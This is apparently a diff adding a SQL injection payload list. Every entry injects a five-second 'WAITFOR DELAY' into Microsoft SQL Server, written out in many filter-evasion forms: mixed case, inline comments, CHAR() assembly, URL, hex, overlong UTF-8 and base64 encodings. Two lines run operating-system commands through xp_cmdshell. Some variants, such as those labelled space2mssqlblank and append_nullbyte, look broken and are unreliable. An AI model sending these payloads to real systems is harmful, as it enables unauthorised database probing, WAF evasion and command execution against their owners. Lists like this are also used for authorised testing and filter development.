@@ -1,0 +1,98 @@
+'; WAITFOR DELAY '00:00:05'--
+'; WAiTfOr    DeLaY '00:00:05'--
+'; W/**/AITFOR/**/DELAY '00:00:05'--
+'; EXEC('W'+'AITFOR DELAY ''00:00:05''')--
+'; EXEC(CHAR(87)+CHAR(65)+CHAR(73)+CHAR(84)+CHAR(70)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(68)+CHAR(69)+CHAR(76)+CHAR(65)+CHAR(89)+CHAR(32)+CHAR(39)+CHAR(48)+CHAR(48)+CHAR(58)+CHAR(48)+CHAR(48)+CHAR(58)+CHAR(48)+CHAR(53)+CHAR(39))--
+'; EXEC master..xp\_cmdshell 'ping -n 6 127.0.0.1'--
+'; EXEC master..xp\_cmdshell 'powershell -Command "Start-Sleep -Seconds 5"'--
+'; WAITFOR DELAY N'00:00:05'--
+'; IF (1=1) BEGIN EXEC(''WAITFOR DELAY ''''00:00:05''''') END--
+'; EXEC('W' + CHAR(0) + 'AITFOR DELAY ''00:00:05''')--
+
+
+[plain]
+'; WAITFOR DELAY '00:00:05'--
+
+[url_encoded]
+%27%3B+WAITFOR+DELAY+%2700%3A00%3A05%27--
+
+[mixed_case_spaces]
+'; wAitfOR DeLAy '00:00:05'--
+
+[comment_obfuscation]
+'; W/**/AITFOR DE/**/LAY '00:00:05'--
+
+[char_concat_exec]
+'; EXEC(CHAR(32)+CHAR(87)+CHAR(65)+CHAR(73)+CHAR(84)+CHAR(70)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(68)+CHAR(69)+CHAR(76)+CHAR(65)+CHAR(89)+CHAR(32)+CHAR(39)+CHAR(48)+CHAR(48)+CHAR(58)+CHAR(48)+CHAR(48)+CHAR(58)+CHAR(48)+CHAR(53)+CHAR(39)+CHAR(45)+CHAR(45))--
+
+[plus_string_concat]
+'; W'+'AITFOR '+'DELAY '00:00:05'--
+
+[apostrophe_null]
+' + CHAR(0) + ; WAITFOR DELAY ' + CHAR(0) + 00:00:05' + CHAR(0) + --
+
+[overlong_utf8_percentencode]
+%27%3b%c0%a0%57%41%49%54%46%4f%52%c0%a0%44%45%4c%41%59%c0%a0%27%30%30%3a%30%30%3a%30%35%27%2d%2d
+
+[char_hex_assembly]
+'; 0x273b2057414954464f522044454c4159202730303a30303a3035272d2d--
+
+[random_comments_between_letters]
+'; W/**/A/**/I/**/T/**/F/**/O/**/R/**/ D/**/E/**/L/**/A/**/Y/**/ '00:00:05'--
+
+[apostrophe_mask]
+"; WAITFOR DELAY "00:00:05"--
+
+[append_nullbyte]
+'; WAITFOR DELAY '00:00:05'--
+
+[base64_encode]
+JzsgV0FJVEZPUiBERUxBWSAnMDA6MDA6MDUnLS0=
+
+[char_double_encode]
+%27%27%3b%3b%20%20%57%57%41%41%49%49%54%54%46%46%4f%4f%52%52%20%20%44%44%45%45%4c%4c%41%41%59%59%20%20%27%27%30%30%30%30%3a%3a%30%30%30%30%3a%3a%30%30%35%35%27%27%2d%2d%2d%2d
+
+[lower_case]
+'; waitfor delay '00:00:05'--
+
+[upper_case]
+'; WAITFOR DELAY '00:00:05'--
+
+[random_case]
+'; waItFOr DELaY '00:00:05'--
+
+[space2comment]
+';/**/WAITFOR/**/DELAY/**/'00:00:05'--
+
+[space2dash]
+';--WAITFOR--DELAY--'00:00:05'--
+
+[space2hash]
+';#WAITFOR#DELAY#'00:00:05'--
+
+[space2morecomment]
+';/**//**/WAITFOR/**//**/DELAY/**//**/'00:00:05'--
+
+[space2morehash]
+';##WAITFOR##DELAY##'00:00:05'--
+
+[space2mssqlblank]
+';WAITFORDELAY'00:00:05'--
+
+[space2mssqlhash]
+';#WAITFOR#DELAY#'00:00:05'--
+
+[space2mysqlblank]
+';WAITFORDELAY'00:00:05'--
+
+[space2mysqldash]
+';--WAITFOR--DELAY--'00:00:05'--
+
+[space2plus]
+';+WAITFOR+DELAY+'00:00:05'--
+
+[space2randomblank]
+'; WAITFOR DELAY'00:00:05'--
+
+[base64]
+JzsgV0FJVEZPUiBERUxBWSAnMDA6MDA6MDUnLS0=
